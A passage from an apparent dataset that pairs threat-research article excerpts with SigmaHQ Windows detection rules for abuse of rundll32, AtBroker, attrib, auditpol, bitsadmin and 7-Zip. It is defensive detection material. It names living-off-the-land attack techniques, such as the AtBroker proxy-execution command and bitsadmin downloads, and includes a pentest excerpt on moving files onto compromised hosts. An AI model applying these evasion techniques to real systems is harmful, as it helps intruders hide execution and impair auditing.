      "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
      "status": "test",
      "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
      "references": [
        "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
        "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
        "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-02-28",
      "modified": "2024-03-07",
      "tags": [
        "attack.t1218.011",
        "attack.t1218.010",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\InstallUtil.exe",
            "\\RegAsm.exe",
            "\\RegSvcs.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe"
          ]
        },
        "filter_main_signed": {
          "Signed": "true"
        },
        "filter_main_sig_status": {
          "SignatureStatus": [
            "errorChaining",
            "errorCode_endpoint",
            "errorExpired",
            "trusted"
          ]
        },
        "filter_main_signed_null": {
          "Signed": null
        },
        "filter_main_signed_empty": {
          "Signed": [
            "",
            "-"
          ]
        },
        "filter_main_sig_status_null": {
          "SignatureStatus": null
        },
        "filter_main_sig_status_empty": {
          "SignatureStatus": [
            "",
            "-"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_unsigned_dll.yml"
  },
  "56": {
    "url": "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true",
    "markdown": "# Hunting for Unsigned DLLs to Find APTs ## Executive Summary Malware authors regularly evolve their techniques to evade detection and execute more sophisticated attacks. We’ve commonly observed one method over the past few years: unsigned DLL loading. Assuming that this method might be used by advanced persistent threats (APTs), we hunted for it. The hunt revealed sophisticated payloads and APT groups in the wild, including the Chinese cyberespionage group Stately Taurus (formerly known as PKPLUG, aka Mustang Panda) and the North Korean Selective Pisces (aka Lazarus Group). Below, we show how hunting for the loading of unsigned DLLs can",
    "sigma_rule": {
      "title": "Unsigned DLL Loaded by Windows Utility",
      "id": "b5de0c9a-6f19-43e0-af4e-55ad01f550af",
      "status": "test",
      "description": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n",
      "references": [
        "https://www.elastic.co/security-labs/Hunting-for-Suspicious-Windows-Libraries-for-Execution-and-Evasion",
        "https://akhere.hashnode.dev/hunting-unsigned-dlls-using-kql",
        "https://unit42.paloaltonetworks.com/unsigned-dlls/?web_view=true"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-02-28",
      "modified": "2024-03-07",
      "tags": [
        "attack.t1218.011",
        "attack.t1218.010",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "image_load"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\InstallUtil.exe",
            "\\RegAsm.exe",
            "\\RegSvcs.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe"
          ]
        },
        "filter_main_signed": {
          "Signed": "true"
        },
        "filter_main_sig_status": {
          "SignatureStatus": [
            "errorChaining",
            "errorCode_endpoint",
            "errorExpired",
            "trusted"
          ]
        },
        "filter_main_signed_null": {
          "Signed": null
        },
        "filter_main_signed_empty": {
          "Signed": [
            "",
            "-"
          ]
        },
        "filter_main_sig_status_null": {
          "SignatureStatus": null
        },
        "filter_main_sig_status_empty": {
          "SignatureStatus": [
            "",
            "-"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_susp_unsigned_dll.yml"
  },
  "57": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "7Zip Compressing Dump Files",
      "id": "ec570e53-4c76-45a9-804d-dc3f355ff7a7",
      "related": [
        {
          "id": "1ac14d38-3dfc-4635-92c7-e3fd1c5f5bfc",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects execution of 7z in order to compress a file with a \".dmp\"/\".dump\" extension, which could be a step in a process of dump file exfiltration.",
      "references": [
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-27",
      "modified": "2023-09-12",
      "tags": [
        "attack.collection",
        "attack.t1560.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Description|contains": "7-Zip"
          },
          {
            "Image|endswith": [
              "\\7z.exe",
              "\\7zr.exe",
              "\\7za.exe"
            ]
          },
          {
            "OriginalFileName": [
              "7z.exe",
              "7za.exe"
            ]
          }
        ],
        "selection_extension": {
          "CommandLine|contains": [
            ".dmp",
            ".dump",
            ".hdmp"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use of 7z with a command line in which \".dmp\" or \".dump\" appears accidentally",
        "Legitimate use of 7z to compress WER \".dmp\" files for troubleshooting"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_7zip_exfil_dmp_files.yml"
  },
  "58": {
    "url": "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
    "markdown": "# Beyond good ol’ Run key, Part 42 **Posted on** 2016-07-22 The Ease of Access is a place where a computer user can enable the so-called Assistive Technologies (AT). These technologies make life easier for the users with needs and include OSK (On-Screen Keyboard), Narrator, Magnifier, and a number of other options that are helping to make the work environment better. ```image Alt: AT_ease_of_access_1 Description: The image depicts the 'Ease of Access Center' from a Windows operating system. It shows a user interface that allows users to access various assistive technologies. The options displayed include 'Start Magnifier', 'Start On-Screen Keyboard',",
    "sigma_rule": {
      "title": "Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE",
      "id": "f24bcaea-0cd1-11eb-adc1-0242ac120002",
      "status": "test",
      "description": "Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-12",
      "modified": "2024-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\AtBroker.exe"
          },
          {
            "OriginalFileName": "AtBroker.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "start"
        },
        "filter_main_builtin": {
          "CommandLine|contains": [
            "animations",
            "audiodescription",
            "caretbrowsing",
            "caretwidth",
            "colorfiltering",
            "cursorindicator",
            "cursorscheme",
            "filterkeys",
            "focusborderheight",
            "focusborderwidth",
            "highcontrast",
            "keyboardcues",
            "keyboardpref",
            "livecaptions",
            "magnifierpane",
            "messageduration",
            "minimumhitradius",
            "mousekeys",
            "Narrator",
            "osk",
            "overlappedcontent",
            "showsounds",
            "soundsentry",
            "speechreco",
            "stickykeys",
            "togglekeys",
            "voiceaccess",
            "windowarranging",
            "windowtracking",
            "windowtrackingtimeout",
            "windowtrackingzorder"
          ]
        },
        "filter_optional_java": {
          "CommandLine|contains": "Oracle_JavaAccessBridge"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate, non-default assistive technology applications execution"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_atbroker_uncommon_ats_execution.yml"
  },
  "59": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/",
    "markdown": "# /Atbroker.exe ## Execute - Execute Helper binary for Assistive Technology (AT) ### Paths: - C:\\Windows\\System32\\Atbroker.exe - C:\\Windows\\SysWOW64\\Atbroker.exe ### Resources: - http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/ ### Detections: - Sigma: proc_creation_win_lolbin_susp_atbroker.yml - Sigma: registry_event_susp_atbroker_change.yml - IOC: Changes to HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\Configuration - IOC: Changes to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs - IOC: Unknown AT starting C:\\Windows\\System32\\ATBroker.exe /start malware ## Execute 1. Start a registered Assistive Technology (AT). ``` ATBroker.exe /start malware ``` - **Use case**: Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry. - **Privileges required**: User",
    "sigma_rule": {
      "title": "Uncommon  Assistive Technology Applications Execution Via AtBroker.EXE",
      "id": "f24bcaea-0cd1-11eb-adc1-0242ac120002",
      "status": "test",
      "description": "Detects the start of a non built-in assistive technology applications via \"Atbroker.EXE\".",
      "references": [
        "http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/",
        "https://lolbas-project.github.io/lolbas/Binaries/Atbroker/"
      ],
      "author": "Mateusz Wydra, oscd.community",
      "date": "2020-10-12",
      "modified": "2024-03-06",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\AtBroker.exe"
          },
          {
            "OriginalFileName": "AtBroker.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "start"
        },
        "filter_main_builtin": {
          "CommandLine|contains": [
            "animations",
            "audiodescription",
            "caretbrowsing",
            "caretwidth",
            "colorfiltering",
            "cursorindicator",
            "cursorscheme",
            "filterkeys",
            "focusborderheight",
            "focusborderwidth",
            "highcontrast",
            "keyboardcues",
            "keyboardpref",
            "livecaptions",
            "magnifierpane",
            "messageduration",
            "minimumhitradius",
            "mousekeys",
            "Narrator",
            "osk",
            "overlappedcontent",
            "showsounds",
            "soundsentry",
            "speechreco",
            "stickykeys",
            "togglekeys",
            "voiceaccess",
            "windowarranging",
            "windowtracking",
            "windowtrackingtimeout",
            "windowtrackingzorder"
          ]
        },
        "filter_optional_java": {
          "CommandLine|contains": "Oracle_JavaAccessBridge"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Legitimate, non-default assistive technology applications execution"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_atbroker_uncommon_ats_execution.yml"
  },
  "60": {
    "url": "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
    "markdown": "# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency **Malware** **Related Products**: [Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/) **Published:** March 5, 2018 **Categories:** - Cybercrime - Malware - Threat Research **Tags:** - ComboJack - Cryptocurrency - Cryptoshuffler - CVE-2017-8579 --- ## Summary Unit 42 researchers have discovered a new currency stealer targeting cryptocurrencies and online wallets. \"ComboJack\" replaces clipboard addresses with an attacker-controlled address, sending funds to the attacker's wallet. This technique relies on victims not checking the destination wallet before finalizing a transaction. In 2017, CryptoShuffler was the first malware to use this tactic. ComboJack targets a range of",
    "sigma_rule": {
      "title": "Hiding Files with Attrib.exe",
      "id": "4281cb20-2994-4580-aa63-c8b86d019934",
      "status": "test",
      "description": "Detects usage of attrib.exe to hide files from users.",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
        "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter"
      ],
      "author": "Sami Ruohonen",
      "date": "2019-01-16",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +h "
        },
        "filter_main_msiexec": {
          "CommandLine|contains": "\\desktop.ini "
        },
        "filter_optional_intel": {
          "ParentImage|endswith": "\\cmd.exe",
          "CommandLine": "+R +H +S +A \\\\\\*.cui",
          "ParentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\\\*.bat"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)",
        "Msiexec.exe hiding desktop.ini"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_hiding_files.yml"
  },
  "61": {
    "url": "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter",
    "markdown": "# LOLBins: Understanding the Silent Operations of Attackers **September 01, 2021** **Tags:** Cloud Security, Threats The Uptycs Threat Research team has observed several malicious binaries in our threat intelligence systems using LOLBins in their attack kill chain. LOLBins (short form for Living Off the Land Binaries), are non-malicious native operating system or known software binaries used for performing malicious activities and evading cyber defenses. The Uptycs Threat research team has created over 300 rules covering different techniques used by LOLBins in the MITRE ATT&CK framework. In this post, we’ll take a look at the LOLBins used by the attackers and",
    "sigma_rule": {
      "title": "Hiding Files with Attrib.exe",
      "id": "4281cb20-2994-4580-aa63-c8b86d019934",
      "status": "test",
      "description": "Detects usage of attrib.exe to hide files from users.",
      "references": [
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
        "https://www.uptycs.com/blog/lolbins-are-no-laughing-matter"
      ],
      "author": "Sami Ruohonen",
      "date": "2019-01-16",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +h "
        },
        "filter_main_msiexec": {
          "CommandLine|contains": "\\desktop.ini "
        },
        "filter_optional_intel": {
          "ParentImage|endswith": "\\cmd.exe",
          "CommandLine": "+R +H +S +A \\\\\\*.cui",
          "ParentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\\\*.bat"
        },
        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe)",
        "Msiexec.exe hiding desktop.ini"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_hiding_files.yml"
  },
  "62": {
    "url": "https://any.run/report/f7b10988747352a0cd43b80ffc8ac821279ca05f695024d0e5009b6e71f758fa/c28cabc8-a19f-40f3-a78b-cae506a5c0d4/",
    "markdown": "# General Info | | | | ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | | **File name** | Instagram 0Day.exe | | **Full analysis** | https://app.any.run/tasks/c28cabc8-a19f-40f3-a78b-cae506a5c0d4 | | **Verdict** | Malicious activity | | **Analysis date** | July 29, 2021 at 15:59:14 | | **OS** | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit) | | **Indicators** | Process was added to the startup, Executable file was dropped, Task contains several apps running, Inspected object has suspicious PE structure | | **MIME** | application/x-dosexec | | **File info** | PE32 executable (GUI) Intel 80386, for MS Windows, UPX compressed | |",
    "sigma_rule": {
      "title": "Set Suspicious Files as System Files Using Attrib.EXE",
      "id": "efec536f-72e8-4656-8960-5e85d091345b",
      "related": [
        {
          "id": "bb19e94c-59ae-4c15-8c12-c563d23fe52b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs\n",
      "references": [
        "https://any.run/report/f7b10988747352a0cd43b80ffc8ac821279ca05f695024d0e5009b6e71f758fa/c28cabc8-a19f-40f3-a78b-cae506a5c0d4/",
        "https://any.run/report/fdf628273629e05facb3b6b55ccf60ecb25eb736c1f22c9500d7ffd86ca6cf85/cfc8870b-ccd7-4210-88cf-a8087476a6d0/",
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +s"
        },
        "selection_paths": {
          "CommandLine|contains": [
            " %",
            "\\Users\\Public\\",
            "\\AppData\\Local\\",
            "\\ProgramData\\",
            "\\Downloads\\",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "filter_optional_installer": {
          "CommandLine|contains|all": [
            "\\Windows\\TEMP\\",
            ".exe"
          ]
        },
        "condition": "all of selection* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_system_susp_paths.yml"
  },
  "63": {
    "url": "https://any.run/report/fdf628273629e05facb3b6b55ccf60ecb25eb736c1f22c9500d7ffd86ca6cf85/cfc8870b-ccd7-4210-88cf-a8087476a6d0/",
    "markdown": "# General Info | | | | ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------- | | **URL** | https://mega.nz/file/QUoGgbQZ#mtMLCy-ecn3aZBQmoRG9JvqBMxApqj140fnplm-HijA | | **Full analysis** | https://app.any.run/tasks/cfc8870b-ccd7-4210-88cf-a8087476a6d0 | | **Verdict** | Malicious activity | | **Threats** | DarkComet, Remote Access Trojan, Trojan | | **Analysis date** | February 08, 2021 at 14:25:07 | | **OS** | Windows 7 Professional Service Pack 1 (build: 7601, 32 bit) | | **Tags** | trojan, rat, darkcomet | | **Indicators** | Process was added to the startup, Task contains an error or was rebooted, Executable file was dropped, Task contains several apps running | | **MD5** | 8B7DB02C6D5A31ACC5D91D2896BA4803 | |",
    "sigma_rule": {
      "title": "Set Suspicious Files as System Files Using Attrib.EXE",
      "id": "efec536f-72e8-4656-8960-5e85d091345b",
      "related": [
        {
          "id": "bb19e94c-59ae-4c15-8c12-c563d23fe52b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs\n",
      "references": [
        "https://any.run/report/f7b10988747352a0cd43b80ffc8ac821279ca05f695024d0e5009b6e71f758fa/c28cabc8-a19f-40f3-a78b-cae506a5c0d4/",
        "https://any.run/report/fdf628273629e05facb3b6b55ccf60ecb25eb736c1f22c9500d7ffd86ca6cf85/cfc8870b-ccd7-4210-88cf-a8087476a6d0/",
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +s"
        },
        "selection_paths": {
          "CommandLine|contains": [
            " %",
            "\\Users\\Public\\",
            "\\AppData\\Local\\",
            "\\ProgramData\\",
            "\\Downloads\\",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "filter_optional_installer": {
          "CommandLine|contains|all": [
            "\\Windows\\TEMP\\",
            ".exe"
          ]
        },
        "condition": "all of selection* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_system_susp_paths.yml"
  },
  "64": {
    "url": "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/",
    "markdown": "# Sure, I’ll take that! New ComboJack Malware Alters Clipboards to Steal Cryptocurrency **Malware** **Related Products**: [Advanced WildFire](https://unit42.paloaltonetworks.com/product-category/advanced-wildfire/) **Published:** March 5, 2018 **Categories:** - Cybercrime - Malware - Threat Research **Tags:** - ComboJack - Cryptocurrency - Cryptoshuffler - CVE-2017-8579 --- ## Summary Unit 42 researchers have discovered a new currency stealer targeting cryptocurrencies and online wallets. \"ComboJack\" replaces clipboard addresses with an attacker-controlled address, sending funds to the attacker's wallet. This technique relies on victims not checking the destination wallet before finalizing a transaction. In 2017, CryptoShuffler was the first malware to use this tactic. ComboJack targets a range of",
    "sigma_rule": {
      "title": "Set Suspicious Files as System Files Using Attrib.EXE",
      "id": "efec536f-72e8-4656-8960-5e85d091345b",
      "related": [
        {
          "id": "bb19e94c-59ae-4c15-8c12-c563d23fe52b",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the usage of attrib with the \"+s\" option to set scripts or executables located in suspicious locations as system files to hide them from users and make them unable to be deleted with simple rights. The rule limits the search to specific extensions and directories to avoid FPs\n",
      "references": [
        "https://any.run/report/f7b10988747352a0cd43b80ffc8ac821279ca05f695024d0e5009b6e71f758fa/c28cabc8-a19f-40f3-a78b-cae506a5c0d4/",
        "https://any.run/report/fdf628273629e05facb3b6b55ccf60ecb25eb736c1f22c9500d7ffd86ca6cf85/cfc8870b-ccd7-4210-88cf-a8087476a6d0/",
        "https://unit42.paloaltonetworks.com/unit42-sure-ill-take-new-combojack-malware-alters-clipboards-steal-cryptocurrency/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-03-14",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\attrib.exe"
          },
          {
            "OriginalFileName": "ATTRIB.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " +s"
        },
        "selection_paths": {
          "CommandLine|contains": [
            " %",
            "\\Users\\Public\\",
            "\\AppData\\Local\\",
            "\\ProgramData\\",
            "\\Downloads\\",
            "\\Windows\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "filter_optional_installer": {
          "CommandLine|contains|all": [
            "\\Windows\\TEMP\\",
            ".exe"
          ]
        },
        "condition": "all of selection* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_attrib_system_susp_paths.yml"
  },
  "65": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/",
    "markdown": "# Deep dive into the Solorigate second-stage activation: From SUNBURST to TEARDROP and Raindrop **Published**: January 20, 2021 --- > **UPDATE:** Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that compromised the supply chain of SolarWinds and impacted multiple other organizations. Microsoft previously used ‘Solorigate’ as the primary designation for the actor, but moving forward, we want to place appropriate focus on the actors behind the sophisticated attacks, rather than one of the examples of malware used by the actors. Microsoft Threat Intelligence Center (MSTIC) has named the",
    "sigma_rule": {
      "title": "Audit Policy Tampering Via Auditpol",
      "id": "0a13e132-651d-11eb-ae93-0242ac130002",
      "related": [
        {
          "id": "c6c56ada-612b-42d1-9a29-adad3c5c2c1e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/"
      ],
      "author": "Janantha Marasinghe (https://github.com/blueteam0ps)",
      "date": "2021-02-02",
      "modified": "2023-02-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\auditpol.exe"
          },
          {
            "OriginalFileName": "AUDITPOL.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "disable",
            "clear",
            "remove",
            "restore"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_auditpol_susp_execution.yml"
  },
  "66": {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File **Network Pentesting | June 16, 2014** --- Pentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files. There are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml"
  },
  "67": {
    "url": "https://isc.sans.edu/diary/22264",
